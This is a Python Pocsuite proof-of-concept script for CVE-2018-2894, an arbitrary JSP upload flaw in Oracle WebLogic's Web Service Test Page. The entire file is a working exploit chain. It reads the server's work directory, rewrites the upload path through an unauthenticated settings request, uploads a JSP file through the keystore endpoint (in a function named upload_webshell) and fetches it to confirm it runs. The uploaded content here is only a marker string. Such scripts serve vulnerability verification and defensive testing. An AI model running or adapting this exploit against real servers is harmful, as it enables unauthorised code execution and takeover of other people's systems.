#!/usr/bin/env python
# coding: utf-8
import re
import sys
import time
import traceback
import xml.etree.ElementTree as ET

from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase



def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        resp = req.get(geturl)
        if resp.status_code == 404:
            exit("[-] {}  don't exists CVE-2018-2894".format(host))
        elif "Deploying Application".lower() in resp.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            resp = req.get(geturl, headers=ua)
        if "</defaultValue>" in resp.content:
            root = ET.fromstring(resp.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except req.ConnectionError:
        exit("[-] Cannot connect url: {}".format(geturl))
    if values:
        return values[0]
    else:
        print("[-] Cannot get current work path\n")
        exit(resp.content)

def get_new_work_path(host):
    origin_work_path = get_current_work_path(host)
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home

def set_new_upload_path(host, path):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    resp = req.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers)
    if "successfully" in resp.content:
        return True
    else:
        print("[-] Change New Upload Path failed")
        exit(resp.content)

def upload_webshell(host, uri):
    set_new_upload_path(host, get_new_work_path(host))
    upload_content = "POC test"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    files = {
        "ks_edit_mode": "false",
        "ks_password_front": "test",
        "ks_password_changed": "true",
        "ks_filename": ("test.jsp",upload_content)
    }

    resp = req.post(host + uri, files=files)
    response = resp.text
    match = re.findall("<id>(.*?)</id>", response)
    if match:
        tid = match[-1]
        shell_path = host + "/ws_utc/css/config/keystore/" + str(tid) + "_test.jsp"
        if upload_content in req.get(shell_path, headers=headers).content:
            print shell_path
            return True
        else:
            return False
    else:
        return False


class TestPOC(POCBase):
    vulID = '0'  # vul ID
    version = '1'
    author = 'liujun'
    vulDate = '2018'
    createDate = '2018'
    updateDate = '2018'
    references = ['https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ']
    name = 'Weblogic 任意文件上传漏洞(CVE-2018-2894)'
    appPowerLink = 'http://www.oracle.com/'
    appName = 'Weblogic'
    appVersion = '12.2.1.3'
    vulType = 'File Upload'
    desc = '''
        Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。
        利用该漏洞，可以上传任意jsp文件，进而获取服务器权限
    '''

    samples = []

    def _verify(self):
        uri = "/ws_utc/resources/setting/keystore"
        result = {}
        flag = upload_webshell(self.url, uri)
        if flag:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _attack(self):
        """attack mode"""
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)



	

